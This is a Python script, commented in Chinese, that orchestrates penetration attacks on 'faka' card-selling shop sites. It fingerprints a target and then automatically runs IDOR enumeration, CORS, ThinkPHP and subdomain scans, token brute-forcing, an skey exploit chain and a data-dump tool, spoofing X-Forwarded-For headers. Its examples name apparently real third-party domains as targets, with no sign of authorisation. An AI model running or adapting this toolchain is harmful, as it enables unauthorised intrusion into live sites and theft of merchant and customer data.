#!/usr/bin/env python3
"""
发卡渗透总控：指纹 → 自动跑对应工具链。

示例:
  python3 faka_run.py https://zhanghao9.com
  python3 faka_run.py https://s.sggyx.com --token xiaoy
  python3 faka_run.py https://qq8.one --rainbow-range 1-500
  python3 faka_run.py https://TARGET --dry-run
"""
from __future__ import annotations

import argparse
import json
import subprocess
import sys
from pathlib import Path

from faka_common import log
from faka_fingerprint import fingerprint

FAKA = Path("/data/tools/faka")


def run(cmd: list[str], dry: bool) -> None:
    log(f"{'[dry] ' if dry else ''}$ {' '.join(cmd)}")
    if not dry:
        subprocess.run(cmd, cwd=str(FAKA))


def parse_args() -> argparse.Namespace:
    ap = argparse.ArgumentParser(description="发卡渗透总控")
    ap.add_argument("url")
    ap.add_argument("--token", default="")
    ap.add_argument("--dry-run", action="store_true")
    ap.add_argument("--skip-fingerprint", action="store_true")
    ap.add_argument("--rainbow-range", default="1-200")
    ap.add_argument("--trade-seeds", default="")
    return ap.parse_args()


def main() -> None:
    args = parse_args()
    url = args.url.rstrip("/")
    dry = args.dry_run

    if not args.skip_fingerprint:
        fp = fingerprint(url)
        log(f"体系={fp.system} 置信={fp.confidence} 信号={fp.signals}")
        if fp.playbook:
            log(f"playbook: {fp.playbook}")
        system = fp.system
    else:
        system = "unknown"

    py = sys.executable

    if system == "acg" or system == "unknown":
        run([py, str(FAKA / "cors_scan.py"), "-u", url + "/user/api/site/info"], dry)
        if args.trade_seeds:
            seeds_file = FAKA / "out" / "_run_seeds.txt"
            seeds_file.write_text(args.trade_seeds.replace(",", "\n"), encoding="utf-8")
            run([py, str(FAKA / "acg_idor.py"), "-u", url, "--trade-list", str(seeds_file), "--xff"], dry)
        domain = url.replace("https://", "").replace("http://", "").split("/")[0]
        run([py, str(FAKA / "sb_subdomain_scan.py"), domain], dry)
        run([py, str(FAKA / "thinkphp_scan.py"), "-u", url, "--xff"], dry)

    if system == "pyfaas" or "sggyx" in url:
        run([py, str(FAKA / "cors_scan.py"), "-u", url + "/shopApi/Shop/info", "-X", "POST", "-d", json.dumps({"token": args.token or "test"})], dry)
        run([py, str(FAKA / "merchant_scan.py"), "-u", url, "--xff", "--limit", "30"], dry)
        if args.token:
            run([py, str(FAKA / "shop_token_scan.py"), "-u", url, "--tokens", args.token], dry)

    if system == "rainbow":
        start, end = args.rainbow_range.split("-", 1)
        run([py, str(FAKA / "rainbow_idor.py"), "-u", url, "--start", start, "--end", end, "-w", "20"], dry)
        host = url.replace("https://", "").replace("http://", "").split("/")[0]
        run([py, str(FAKA / "skey_chain.py"), "-H", host, "--skip-idor"], dry)

    if system == "pisces":
        run([py, str(FAKA / "pisces_dump.py"), url], dry)

    if system == "unknown":
        run([py, str(FAKA / "faka_fingerprint.py"), url], dry)
        run([py, str(FAKA / "thinkphp_scan.py"), "-u", url], dry)
        run([py, str(FAKA / "js_api_extract.py"), url], dry)

    log("完成")


if __name__ == "__main__":
    main()
